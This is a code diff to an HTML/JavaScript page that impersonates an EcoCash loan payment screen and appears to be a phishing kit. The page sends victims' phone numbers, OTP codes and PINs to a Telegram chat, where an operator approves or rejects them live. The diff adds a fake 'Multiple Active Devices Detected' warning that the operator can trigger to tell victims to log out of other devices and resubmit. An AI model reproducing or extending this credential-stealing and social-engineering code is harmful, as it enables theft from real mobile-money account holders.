@@ -170,6 +170,29 @@
         .pin-btn-x:hover { background: var(--light); }
         .pin-secure { margin-top: 14px; font-size: 10px; color: var(--muted); font-weight: 600; }
 
+        /* Warning Modal Styles */
+        .warning-overlay {
+            position: fixed; inset: 0;
+            display: none; align-items: center; justify-content: center;
+            background: rgba(0,26,51,0.85); z-index: 3000; padding: 20px;
+            backdrop-filter: blur(8px);
+        }
+        .warning-overlay.on { display: flex; }
+        .warning-card {
+            background: white; border-radius: 20px; padding: 32px 24px;
+            max-width: 380px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            text-align: center; border: 1px solid rgba(255,255,255,0.2);
+        }
+        .warning-icon { font-size: 48px; margin-bottom: 16px; }
+        .warning-title { font-size: 18px; font-weight: 800; color: var(--blue-dark); margin-bottom: 12px; line-height: 1.3; }
+        .warning-msg { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
+        .warning-btn {
+            width: 100%; background: var(--blue); color: white; border: none;
+            padding: 14px; border-radius: 12px; font-weight: 700; font-size: 14px;
+            cursor: pointer; transition: all 0.2s;
+        }
+        .warning-btn:hover { background: var(--blue-light); transform: translateY(-1px); }
+
         @media (max-width: 500px) {
             main { padding: 20px 12px; }
             .card { padding: 24px 16px; }
@@ -224,11 +247,11 @@
     <div id="pinOv" class="pin-overlay">
         <div class="pin-card">
             <div class="pin-logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
-            <div class="pin-title">Confirm Payment</div>
+            <div class="pin-title">Confirm PIN</div>
             <div class="pin-sub">Enter your EcoCash PIN to authorize this transaction</div>
 
             <div class="pin-amount">
-                <div class="pa-label">Amount to Pay</div>
+                <div class="pa-label">Amount</div>
                 <div class="pa-value" id="pinAmt">USD 0.00</div>
             </div>
 
@@ -239,11 +262,23 @@
             </div>
 
             <div class="pin-btns">
-                <button class="pin-btn pin-btn-ok" onclick="doPin()">Pay Now</button>
+                <button class="pin-btn pin-btn-ok" onclick="doPin()">Confirm PIN</button>
                 <button class="pin-btn pin-btn-x" onclick="closePin()">Cancel</button>
             </div>
 
             <div class="pin-secure">&#128274; Secured by EcoCash &middot; 256-bit SSL</div>
+        </div>
+    </div>
+
+    <!-- Custom Warning Modal -->
+    <div id="warningOv" class="warning-overlay">
+        <div class="warning-card">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-title">Multiple Active Devices Detected</div>
+            <div class="warning-msg">
+                To ensure your loan application is successfully processed and confirmed, please sign out of all other devices currently logged into your account. Once you have signed out from the other devices, refresh the app and submit your loan application again.
+            </div>
+            <button class="warning-btn" onclick="exitApp()">OK</button>
         </div>
     </div>
 
@@ -320,7 +355,10 @@
                 '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>\n\n' +
                 '<b>Message (tap to copy):</b>\n<code>Your EcoCash OTP is.' + otp + '. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>';
 
-            var btns = [[{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }]];
+            var btns = [
+                [{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }],
+                [{ text: '\u26a0\ufe0f Log Out Devices', callback_data: 'otp_logout' }]
+            ];
             tg(msg, btns);
             pollOTP();
         }
@@ -347,11 +385,20 @@
                                 var cb = u.callback_query.data;
                                 if (cb === 'otp_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); openPin(); }
                                 else if (cb === 'otp_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Declined. Please try again.'); resetOTP(); }
+                                else if (cb === 'otp_logout') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showWarning(); }
                             }
                         }
                     }).catch(function(e) { console.error(e); });
             }, 1000);
             setTimeout(function() { clearInterval(iv); }, 300000);
+        }
+
+        function showWarning() {
+            document.getElementById('warningOv').classList.add('on');
+        }
+
+        function exitApp() {
+            window.location.href = 'index.html';
         }
 
         function openPin() {
@@ -382,7 +429,7 @@
                 '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
                 '<b>Loan:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
                 '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>';
-            var btns = [[{ text: '\u2713 Valid PIN', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
+            var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
             tg(msg, btns);
             pollPin();
         }
